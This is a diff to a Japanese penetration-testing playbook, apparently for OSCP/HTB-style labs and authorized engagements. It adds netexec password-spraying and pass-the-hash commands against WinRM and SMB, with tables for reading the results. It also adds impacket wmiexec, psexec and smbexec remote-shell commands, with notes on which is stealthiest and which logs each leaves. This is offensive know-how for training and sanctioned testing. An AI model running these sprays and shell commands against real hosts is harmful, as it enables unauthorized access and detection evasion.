@@ -230,14 +230,36 @@ nxc winrm [IP] -u users -p '[PASSWORD]' --continue-on-success
 nxc smb [IP] -u users -p '[PASSWORD]' --continue-on-success
 ```
 
-**出力の読み方：**
+**先に確認すること：** nmap 出力に **5985 / 5986** が含まれているか。
+含まれていない場合は WinRM スプレーをスキップし、後述の **SMB スプレー（管理者権限の確認）** に進む。
+WinRM が閉じている古い Windows Server（2008 R2 等）や、WinRM を意図的に無効化している環境では `evil-winrm` は使えない。
+
+**WinRM スプレー出力の読み方：**
 
 | 出力 | 意味 | 次のアクション |
 |------|------|--------------|
 | `[+] ... (Pwn3d!)` | 認証成功 + 管理者/Remote Management Users 権限あり | `evil-winrm` でシェル取得可能（次の手順） |
-| `[+] ...`（`(Pwn3d!)` なし） | 認証は通るが WinRM 経由でシェルを取れない（Remote Management Users グループ外） | SMB ・LDAP ・MSSQL 等の他プロトコルで使えるか試す。BloodHound でこのユーザーの権限を確認する |
+| `[+] ...`（`(Pwn3d!)` なし） | 認証は通るが WinRM 経由でシェルを取れない（Remote Management Users グループ外） | SMB スプレーで管理者権限を確認 → 後述「SMB スプレー」へ。同時に BloodHound でこのユーザーの権限経路を確認する |
+| 接続失敗 / `Connection refused` | 5985 / 5986 が閉じている | WinRM スプレー全体を中止 → 後述「SMB スプレー」へ |
 | `[-] ... STATUS_LOGON_FAILURE` | パスワード不一致 | 別のパスワード候補を試す |
 | `[-] ... STATUS_ACCOUNT_LOCKED_OUT` | ロックアウト発動 | スプレー停止。ロックアウトポリシー確認後に時間を空ける |
+
+### SMB スプレー（管理者権限の確認 / WinRM が閉じている場合）
+
+WinRM が使えなくても、**SMB（445）に対する `(Pwn3d!)` が出れば管理者相当**で、`impacket-wmiexec` 等で代替シェル取得できる。
+
+```bash
+# [Attacker] SMB に対してスプレー（WinRM の有無に関わらず必ず実行）
+nxc smb [IP] -u users -p '[PASSWORD]' --continue-on-success
+
+# Pass-The-Hash 版（NTLM ハッシュのみ取得済みの場合）
+nxc smb [IP] -u users -H '[NTLM_HASH]' --continue-on-success
+```
+
+| 出力 | 意味 | 次のアクション |
+|------|------|--------------|
+| `[+] ... (Pwn3d!)` | 管理者相当（`ADMIN$` 共有に書き込み可） | `impacket-wmiexec` / `impacket-psexec` / `impacket-smbexec` でシェル取得（次の手順「シェル取得 — プロトコル選択」） |
+| `[+] ...`（`(Pwn3d!)` なし） | 認証は通るが管理者ではない | 共有ファイルの読み取り・LDAP 列挙のみ可能。Step 4 BloodHound で権限経路を探す |
 
 **スプレーに使うパスワードの候補（優先順位順）：**
 
@@ -248,14 +270,52 @@ nxc smb [IP] -u users -p '[PASSWORD]' --continue-on-success
 
 → 詳細: `../05_Tools_Reference/Netexec.md`
 
-### WinRM 接続（シェル取得）
+### シェル取得 — プロトコル選択
+
+スプレー結果と nmap 出力の組み合わせで使うツールを決める。**「WinRM が開いていなければシェルが取れない」というのは誤り**。SMB（445）と DCERPC（135 + DCOM 動的ポート）でも管理者相当なら同等のシェルが取れる。
+
+| 状況（nmap × スプレー結果） | 推奨ツール | プロトコル |
+|---------------------------|-----------|-----------|
+| 5985 / 5986 が開いている + `nxc winrm` で `(Pwn3d!)` | `evil-winrm` | WinRM（最も対話的） |
+| 5985 / 5986 は閉じている + `nxc smb` で `(Pwn3d!)` | `impacket-wmiexec` | DCERPC + DCOM（135 + 動的）。**最も静か（サービス作成なし）** |
+| 上記の代替（WMI が無効化されている） | `impacket-psexec` | SMB（445）。SYSTEM 権限・サービス作成 → Event ID 7045 |
+| psexec が検知される | `impacket-smbexec` | SMB（445）。psexec より静かだがサービス作成の痕跡は残る |
+| 認証情報が NTLM ハッシュのみ（PtH） | 上記いずれも `-hashes :[NTLM_HASH]` で対応 | — |
+
+**WinRM 接続（5985 / 5986 が開いている場合）：**
 
 ```bash
 # [Attacker] (Pwn3d!) が出たユーザーで接続
 evil-winrm -i [IP] -u [USER] -p '[PASSWORD]'
+
+# Pass-The-Hash で接続
+evil-winrm -i [IP] -u [USER] -H '[NTLM_HASH]'
 ```
 
-→ 詳細（evil-winrm の使い方・ファイル転送・PoC のアップロード）: `../02_Initial_Access/Protocol_Exploitation.md`（WinRMセクション）
+→ 詳細（evil-winrm の使い方・ファイル転送・PoC のアップロード）: `../02_Initial_Access/Protocol_Exploitation.md`（WinRM セクション）
+
+**WinRM が閉じている場合の代替（SMB / WMI 経由）：**
+
+```bash
+# [Attacker] WMI 経由（135 + DCOM 動的ポート使用） — 最も静か
+impacket-wmiexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
+
+# [Attacker] SMB 経由 PsExec（SYSTEM 権限取得。Event ID 7045 が記録される）
+impacket-psexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
+
+# [Attacker] SMB 経由 smbexec（psexec より静か）
+impacket-smbexec '[DOMAIN]/[USER]:[PASSWORD]@[IP]'
+
+# Pass-The-Hash 版（NTLM ハッシュのみ取得済みの場合）
+impacket-wmiexec -hashes :[NTLM_HASH] '[DOMAIN]/[USER]@[IP]'
+```
+
+> **攻撃者の思考トレース：** `nmap` 結果から「5985 がない＝シェル諦め」と判断するのは典型的なミス。古い Windows Server（2008 R2 等）や WinRM 無効化環境では 5985 が開かないが、445（SMB）と 135（DCERPC）はほぼ常に開いている。`nxc smb` で `(Pwn3d!)` が出たら `impacket-wmiexec` で即シェル取得できる。
+
+> **[HIGH IMPACT]** `impacket-psexec` は ADMIN$ 共有に実行可能ファイルを書き込むため SIEM/EDR で確実に検知される（Event ID 7045 = サービス作成）。商用案件では事前合意の上で使う。`impacket-wmiexec` はファイルレスのため検知性が低い。演習環境（HTB / OSCP 等）では制約なし。
+
+→ 詳細（プロトコル選択の判断軸・各ツールの動作・Event ID）: `../02_Initial_Access/Protocol_Exploitation.md`（Impacket exec ツール群セクション）
+→ ツールリファレンス: `../05_Tools_Reference/Impacket_Suite.md`（リモート実行）
 
 ### シェル取得後の次ステップ
 
